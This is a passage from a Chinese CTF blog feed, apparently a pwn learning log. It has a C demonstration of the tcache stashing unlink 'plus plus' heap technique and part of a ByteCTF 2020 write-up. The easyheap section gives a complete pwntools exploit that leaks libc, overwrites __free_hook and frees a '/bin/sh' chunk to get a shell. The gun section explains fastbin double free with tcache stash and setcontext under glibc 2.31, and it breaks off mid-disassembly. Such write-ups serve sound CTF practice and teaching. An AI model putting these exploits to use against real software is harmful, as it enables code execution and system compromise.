plus"></a><code>tcache_stashing_unlink plus plus</code></h3><p>也就是可以同时实现上面的2个功能。</p><ul><li>任意地址分配一个chunk</li><li>任意地址写入一个<code>main_arena</code>附近的值</li></ul><h4 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim2 = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<span class="hljs-keyword">char</span> *t1;<span class="hljs-keyword">char</span> *s1, *s2, *pad;<span class="hljs-keyword">char</span> *tmp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n"</span>);tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, &amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim2's address: %p, victim2's value: 0x%lx\n"</span>,&amp;victim2, victim2);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. change victim's data, make victim[1] = &amp;victim2-0x10\n"</span>);victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim2)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. choose a stable size and free five identical size chunks to tcache_entry list\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, &amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Apply to tcache_entry[4], you can get a pointer to victim address\n"</span>);<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim2's value: 0x%lx\n"</span>,victim2);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h4 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h4><p>基本跟第2个一样，断点还是断在相似的位置，然后分析相关位置的代码即可。</p><p>调试完成发现，其跟第二个十分相似，只是在第二个中保证的是：<code>目标地址+8</code>为一个可写的地址即可。然而想要实现一个地方写入一个巨大的<code>main_arena</code>附近的值，只需把<code>目标地址+8</code>为这个地方-0x10即可。</p><div class="hljs"><pre><code class="hljs c">bck-&gt;fd = bin;</code></pre></div><h4 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h4><p>重点操作在：</p><ul><li>将 Smallbins 里的后一个进入的chunk的 bk 设置为目标地址 1 减 0x10</li><li>将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。</li></ul><p>这样就可以分配到目标地址 1的chunk，同时向目标地址 2 写入一个大数字。</p><h3 id="相关例题-1"><a href="#相关例题-1" class="headerlink" title="相关例题"></a>相关例题</h3><ul><li><code>2019-HITCON-one_punch_man</code></li><li><code>2019-HITCON-lazyhouse</code></li><li><code>2020-XCTF-GXZY-twochunk</code></li><li><code>BUU 新春红包3</code></li></ul><p>其中均为libc2.29下的题目，但是基本不影响对漏洞利用的学习。</p><h2 id="参加链接"><a href="#参加链接" class="headerlink" title="参加链接"></a>参加链接</h2><p><a href="https://zhuanlan.zhihu.com/p/136983333" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/136983333</a></p><p><a href="http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89" target="_blank" rel="noopener">http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>heap</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bytectf2020部分wp</title>
    <link href="/2020/10/27/Bytectf2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/10/27/Bytectf2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Bytectf2020部分wp"><a href="#Bytectf2020部分wp" class="headerlink" title="Bytectf2020部分wp"></a>Bytectf2020部分wp</h1><h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是漏洞点比较隐蔽。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2mcWzH.png" srcset="/img/loading.gif" alt><br>此处第一次申请chunk时的size，作为后面一个偏移来写0。如果故意第一次时输入不是<code>0～0x80</code>的范围，其就可以实现任意地址写0。其中这个v2也可以是负数。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>leak libc</li><li>在tcache chain上写个0，用tcache attcak打free hook</li><li>free 一个带有<code>/bin/sh\x00</code>的chunk</li></ul><h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><h5 id="libc-malloc中tcache-get函数"><a href="#libc-malloc中tcache-get函数" class="headerlink" title="__libc_malloc中tcache_get函数"></a><code>__libc_malloc</code>中<code>tcache_get</code>函数</h5><h6 id="在libc-2-31中"><a href="#在libc-2-31中" class="headerlink" title="在libc 2.31中"></a>在<code>libc 2.31</code>中</h6><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)  &#123;    <span class="hljs-keyword">return</span> tcache_get (tc_idx);  &#125;</code></pre></div><p>这里看到其中调用<code>tcache_get</code>的第三个条件是<code>tcache-&gt;counts[tc_idx] &gt; 0</code> </p><h6 id="在libc-2-30以下"><a href="#在libc-2-30以下" class="headerlink" title="在libc 2.30以下"></a>在<code>libc 2.30</code>以下</h6><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-meta">if</span> (tc_idx &lt; mp_.tcache_bins    <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span>    <span class="hljs-variable">&amp;&amp;</span> tcache    <span class="hljs-variable">&amp;&amp;</span> tcache-&gt;entries[tc_idx] != <span class="hljs-meta">NULL</span>)  &#123;    <span class="hljs-meta">return</span> tcache_get (tc_idx);  &#125;</code></pre></div><p>这里看到其中调用<code>tcache_get</code>的第三个条件是<code>tcache-&gt;entries[tc_idx] != NULL</code></p><h5 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h5><p>这样就使得当初的一个攻击套路失效了。 </p><p><img src="http://qiqianyun.chumen77.xyz/uPic/j0fmUh.png" srcset="/img/loading.gif" alt><br>比如开始0x50的<code>tcache-&gt;counts[tc_idx] = 1</code>，倘若攻击了chunk1的fd，使其指向目标地址。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/LO0Kwl.png" srcset="/img/loading.gif" alt><br>在申请完chunk1后，<code>tcache-&gt;counts[tc_idx] = 0</code>，此时就过不去了libc2.31的检查，就无法调用<code>tcache_get</code>获取tag chunk。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./easyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:io = process(local_file)libc = elf.libc<span class="hljs-keyword">else</span>:io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)libc = elf.libc<span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'ize'</span>,str(size))sla(<span class="hljs-string">'ent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):free(<span class="hljs-number">7</span>-i)sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x100</span>))sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x8</span>))sla(<span class="hljs-string">'ent'</span>,str(<span class="hljs-string">'1'</span>*<span class="hljs-number">7</span> + <span class="hljs-string">'2'</span> +<span class="hljs-string">'\n'</span>))show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'2'</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1ebc60</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0x1eeb28</span>+libcbase))add(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0x1eeb28</span>+libcbase))free(<span class="hljs-number">4</span>)free(<span class="hljs-number">7</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">3</span>)sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x121</span>))sla(<span class="hljs-string">'ize'</span>,str(<span class="hljs-number">0x80</span>))sla(<span class="hljs-string">'ent'</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, <span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, <span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0x55410</span>+libcbase))free(<span class="hljs-number">6</span>)itr()</code></pre></div><h2 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="buy函数"><a href="#buy函数" class="headerlink" title="buy函数"></a>buy函数</h4><ul><li>申请的 chunk 大小 <code>0xf - 0x500</code></li><li>申请的chunk 在bss的表现为：1个name的buf，1个next chunk，1个此chunk 的flag位</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Bullet</span>&#123;</span><span class="hljs-keyword">char</span>* name;    Bullet* next;    <span class="hljs-keyword">int</span> flag;&#125;;<span class="hljs-keyword">sizeof</span>(Bullet) = <span class="hljs-number">0x18</span></code></pre></div><h4 id="load函数"><a href="#load函数" class="headerlink" title="load函数"></a>load函数</h4><ul><li>检查chunk的flag位，若为0或者2，退出不接着执行。</li><li>若待操作位<code>0x04060</code>处已经存在数值，其就在该chunk 的next 处，填上此数值</li><li>操作位<code>0x04060</code> 写入该chunk在bss的位置，并设置flag为2，其在多次调用后，会形成一个链表</li></ul><h4 id="shoot函数"><a href="#shoot函数" class="headerlink" title="shoot函数"></a>shoot函数</h4><ul><li>先检查 操作位<code>0x04060</code>处是否为空</li><li>读入发射的子弹数，并存在一个buf中，留着做比较</li><li>判断操作位<code>0x04060</code>处不为空，且i 小于子弹数，开始一个循环： 打印name，释放chunk，操作位<code>0x04060</code> 写入该chunk的next 指针，设置flag为0，i++</li></ul><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>并未对chunk的next 指针进行清0，在多次申请并load后，其就会存在数据。倘若先释放一个chunk后，其free的机制会用这个next指针数据的残余，可能还会释放一次刚刚释放过的chunk</p><h3 id="攻击细节要点"><a href="#攻击细节要点" class="headerlink" title="攻击细节要点"></a>攻击细节要点</h3><p>由于程序的libc为2.31，其对tcache进行了double free的检测，绕过的办法可以是更改下其bk处的key值。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//倘若key值改为其他值，即bypass</span>     &#123;       tcache_entry *tmp;       LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);       <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)         <span class="hljs-keyword">if</span> (tmp == e)           malloc_printerr(<span class="hljs-string">"free(): double free detected in tcache 2"</span>);     &#125;</code></pre></div><p>但是此题无法修改到这个key，因此采用使用fastbin attack。如何从转移到fastbin attack，主要使用到tcache的stash机制。（单纯进行fastbin attack的话也是可以的，跟往常的fastbin attack是一样的，但是用了tcache的stash机制会更加方便，并且也是很容易实现和触发的）</p><h4 id="tcache的stash机制"><a href="#tcache的stash机制" class="headerlink" title="tcache的stash机制"></a>tcache的stash机制</h4><p>这里分析一下对于fastbin的stash机制</p><div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())) <span class="hljs-comment">//size在fastbin范围内</span>  &#123;    idx = fastbin_index(nb);    mfastbinptr *fb = &amp;fastbin(av, idx);    mchunkptr pp;    victim = *fb;     <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//如果有chunk</span>    &#123;      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span>      <span class="hljs-keyword">else</span>        REMOVE_FB(fb, pp, victim);       <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>))       &#123;        <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));        <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>)) <span class="hljs-comment">//对fastbin的size检查</span>          malloc_printerr(<span class="hljs-string">"malloc(): memory corruption (fast)"</span>);        check_remalloced_chunk(av, victim, nb);  <span class="hljs-comment">//if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中</span>        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>        <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span>        &#123;          mchunkptr tc_victim;           <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span>          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//只要tcache没满，并且fastbin还有chunk</span>          &#123;            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//从fastbin中取出</span>              *fb = tc_victim-&gt;fd;            <span class="hljs-keyword">else</span>            &#123;              REMOVE_FB(fb, pp, tc_victim);              <span class="hljs-keyword">if</span> (__glibc_unlikely(tc_victim == <span class="hljs-literal">NULL</span>))                <span class="hljs-keyword">break</span>;            &#125;            tcache_put(tc_victim, tc_idx);<span class="hljs-comment">//放入tcache中</span>          &#125;        &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);        alloc_perturb(p, bytes);        <span class="hljs-keyword">return</span> p;      &#125;    &#125;  &#125;</code></pre></div><p>也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。</p><h4 id="fastbin-double-free遇上Tcache-Stash"><a href="#fastbin-double-free遇上Tcache-Stash" class="headerlink" title="fastbin double free遇上Tcache Stash"></a>fastbin double free遇上Tcache Stash</h4><p>假设有个double free可以触发，其用到fastbin上：<br>进行free 多次构成：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/G59EQi.png" srcset="/img/loading.gif" alt></p><p>为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）</p><p>然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：<br><img src="http://qiqianyun.chumen77.xyz/uPic/S4rab1.png" srcset="/img/loading.gif" alt></p><p>主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。</p><p>但是有了stash这个机制，其就变成了以下的情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/68p4Vb.png" srcset="/img/loading.gif" alt></p><p>由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk 7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 7 tag 。这就相当于劫持了tcache chain，可以实现任意地址写。</p><h4 id="libc2-31-下的-setcontext利用"><a href="#libc2-31-下的-setcontext利用" class="headerlink" title="libc2.31 下的 setcontext利用"></a>libc2.31 下的 setcontext利用</h4><p>在libc2.31下 setcontext函数变成了用rdx来控制对应参数，导致原来的攻击办法失效。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x7fa30df8f0d6</span> &lt;setcontext+<span class="hljs-number">54</span>&gt;:      <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x1c0</span>]   <span class="hljs-number">0x7fa30df8f0dd</span> &lt;setcontext+<span class="hljs-number">61</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]   <span class="hljs-number">0x7fa30df8f0e4</span> &lt;setcontext+<span class="hljs-number">68</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]   <span class="hljs-number">0x7fa30df8f0eb</span> &lt;setcontext+<span class="hljs-number">75</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]   <span class="hljs-number">0x7fa30df8f0ef</span> &lt;setcontext+<span class="hljs-number">79</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]   <span class="hljs-number">0x7fa30df8f0f3</span> &lt;setcontext+<span class="hljs-number">83</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]   <span class="hljs-number">0x7fa30df8f0f7</span> &lt;setcontext+<span class="hljs-number">87</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]   <span 